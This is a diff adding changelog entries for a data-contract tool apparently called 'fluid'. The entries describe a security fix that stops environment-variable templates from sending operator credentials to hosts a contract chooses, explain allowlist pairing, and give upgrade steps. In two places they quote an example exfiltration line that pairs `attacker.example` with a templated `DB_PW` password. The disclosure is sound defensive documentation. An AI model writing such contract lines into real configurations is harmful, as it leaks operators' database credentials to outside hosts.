@@ -66,6 +66,22 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   validation report, `fluid generate artifacts` (which runs where the bundle is built, not where
   it is deployed) and the preload of a contract embedded in a plan leave the placeholder of an unset
   or empty variable as written, by name (`UNSET_DEFER`): `tests/test_env_templates_defer_sites.py` lists them.
+- **On the acquisition path, an `{{ env.NAME }}` goes only to the endpoints the operator paired it
+  with.** A source or sink block with a host the contract picked sent every variable it named to
+  that host: `connection: {host: attacker.example, password: "{{ env.DB_PW }}"}` rendered DB_PW and
+  sent it there, and so did a catalog's `warehouse`, `bucket` or `catalogAuth` beside a `uri`. A
+  name cannot tell a secret from the rest (`DB_PW`, `PGPASS` and `DATABASE_URL` look like none), so
+  the key is the destination. Each variable, whatever it is called, in `properties.source`, in
+  `properties.sink` and in the `binding.location` of the exposes the build writes now renders only
+  when every endpoint of those blocks is this machine (loopback, a local socket), a host written
+  as one whole `{{ env.* }}` (`host: "{{ env.PGHOST }}"`: the operator chose the address), or a
+  host the operator paired with it (`NAME@host` in `FLUID_ACQUISITION_SECRET_REF_ALLOWLIST`, or the
+  bare `NAME` for any host). The endpoints are the ones the secret policy reads for a `secretRef`
+  in the same block (keyword connection strings, query-string hosts, SSH tunnels, host lists,
+  Snowflake's `account`), so a blank or unreadable endpoint refuses; a block whose one destination
+  is an object store, or that names no endpoint, has nothing to judge. The refusal
+  (`EnvTemplateHostError`, reason `unpaired`) names the variable, the field that writes it and the
+  host as written, never a rendered value.
 
 ### Deprecated
 
@@ -104,6 +120,11 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   whole host (`host: "{{ env.PGHOST }}"`, `https://{{ env.CATALOG_HOST }}/catalog`) needs no
   pairing: the operator chose the address. The refusal names the variable and the field, never the
   rendered value.
+- **No operator variable reaches a host the contract picks, whatever it is called (acquisition
+  builds).** `connection: {host: attacker.example, password: "{{ env.DB_PW }}"}` rendered the
+  password and sent it to attacker.example, and a variable's name cannot tell `DB_PW`, `PGPASS` or
+  `DATABASE_URL` from a harmless one. Each variable now renders only for the endpoints of its
+  block that the operator paired it with (see Changed).
 
 ### Upgrade notes
 
@@ -118,6 +139,13 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   `FLUID_ACQUISITION_SECRET_REF_ALLOWLIST=TENANT@<the host it renders to>` (or the bare variable
   for any host) in the operator environment; a credential-shaped variable in a URL is refused:
   give the credential to the connector as a secretRef. `host: "{{ env.PGHOST }}"` is unchanged.
+- **Acquisition builds: a variable beside a host the contract picks needs the operator's pairing.**
+  A contract with `host: db.internal` and `password: "{{ env.DB_PW }}"`, or a catalog `uri` beside
+  `{{ env.* }}` settings, now stops until the operator lists `DB_PW@db.internal` (the catalog's
+  host for the catalog's variables) in `FLUID_ACQUISITION_SECRET_REF_ALLOWLIST`, hands the value
+  over as a `secretRef`, or writes the host as one `{{ env.PGHOST }}`. Contracts written by
+  `fluid import meltano`, `airbyte` and `singer` put a literal host beside `{{ env.PASSWORD }}`,
+  so they need those entries.
 - **A split contract's digest changes once.** If an upstream keeps parts of its contract in `$ref`
   fragments, the digest that `fluid contract digest` prints, and that `fluid apply`'s federation
   gate computes, is now of the composed contract. Re-pin `consumes[].upstreamDigest` for such an
